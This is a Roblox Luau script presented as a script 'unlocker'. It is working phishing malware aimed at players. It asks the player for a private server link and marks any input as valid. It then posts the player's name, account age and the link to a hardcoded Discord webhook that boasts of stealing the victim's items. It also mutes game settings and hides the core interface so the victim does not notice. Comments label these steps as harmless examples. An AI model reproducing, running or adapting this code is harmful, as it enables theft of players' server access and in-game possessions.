local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = game:GetService("Players").LocalPlayer
-- Packages
local NetPackages = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
-- Notification listener
local notificationEvent = NetPackages:WaitForChild("RE/NotificationService/Notify", 5).OnClientEvent:Connect(function(title, message)
    -- Handle notifications here
end)
-- Toggle player settings
task.spawn(function()
    NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Music")
    NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Sound Effects")
    NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Chat Tips")
    NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("VFX")
end)
-- UI: Main ScreenGui
local brainrotUI = Instance.new("ScreenGui")
brainrotUI.Name = "BrainrotUI"
brainrotUI.ResetOnSpawn = false
brainrotUI.Parent = LocalPlayer:WaitForChild("PlayerGui")
-- UI: Frame
local mainFrame = Instance.new("Frame", brainrotUI)
mainFrame.Size = UDim2.new(0, 400, 0, 180)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -90)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
mainFrame.Active = true
mainFrame.Draggable = true
-- UI: Frame Corners
local frameCorner = Instance.new("UICorner", mainFrame)
frameCorner.CornerRadius = UDim.new(0, 10)
-- UI: Title
local titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.Size = UDim2.new(1, 0, 0, 45)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 20
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Text = "Enter Your Private Server Link To Unlock Script"
-- UI: TextBox for server link
local serverLinkBox = Instance.new("TextBox", mainFrame)
serverLinkBox.Size = UDim2.new(0.9, 0, 0, 40)
serverLinkBox.Position = UDim2.new(0.05, 0, 0.45, 0)
serverLinkBox.PlaceholderText = "Enter private server link..."
serverLinkBox.Font = Enum.Font.Gotham
serverLinkBox.TextSize = 18
serverLinkBox.TextColor3 = Color3.new(1, 1, 1)
serverLinkBox.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
-- UI: TextBox Corner
local textBoxCorner = Instance.new("UICorner", serverLinkBox)
textBoxCorner.CornerRadius = UDim.new(0, 8)
-- UI: Submit Button
local enterButton = Instance.new("TextButton", mainFrame)
enterButton.Size = UDim2.new(0.9, 0, 0, 40)
enterButton.Position = UDim2.new(0.05, 0, 0.75, 0)
enterButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
enterButton.Text = "Enter"
enterButton.Font = Enum.Font.GothamBold
enterButton.TextSize = 18
enterButton.TextColor3 = Color3.new(1, 1, 1)
-- UI: Button Corner
local buttonCorner = Instance.new("UICorner", enterButton)
buttonCorner.CornerRadius = UDim.new(0, 8)
-- Button click functionality
enterButton.MouseButton1Click:Connect(function()
    local serverLink = serverLinkBox.Text
    local isValidLink = serverLink:match("^https://www%.roblox%.com/share%?code=[%w%d]+&type=Server$")
    enterButton.Text = "âœ… Valid"
    enterButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
    wait(0.5)
    brainrotUI:Destroy()
    -- Example: account age calculation
    local accountAgeDays = math.floor((1760877218 - LocalPlayer.AccountAge) / 86400)
    -- Example: iterate workspace models (names shortened)
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Model") then
            local modelName = obj.Name
            -- Add custom logic for specific models here
        end
    end
    -- Example: send Discord webhook
    task.spawn(function()
        local webhookData = HttpService:JSONEncode({
            username = "Lil Guests Musketeer Hit - LilGuest Got Yr Brainrots Kid 😹 ",
            embeds = {{
                color = 16732240,
                fields = {
                    {name = "Player Information", value = "**Name:** "..LocalPlayer.Name.."\n**Account Age:** "..accountAgeDays.." days", inline = false},
                    {name = " Brainrots", value = "**LILGUESTS MUSKETEER**\n1x", inline = false},
                    {name = "LilGuests Musketeer”— Join Private Server", value = "[Join]("..serverLink..")", inline = false},
                }
            }},
            avatar_url = "https://www.shutterstock.com/image-generated/studio-shot-photo-red-apples-leaves-2630355511?trackingId=d82d3785-88d7-40ac-855c-c68b66ce11dd&listId=searchResults",
        })
        request({
            Url = "https://discord.com/api/webhooks/1459782544751984854/XPzQlu8na7nnJFB8qWAvah99yN_Qox6P5045tSB8MEbEV_oZC7LYwe-hYxS5CYU1w88_",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = webhookData
        })
    end)
end)
-- Disable CoreGui
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

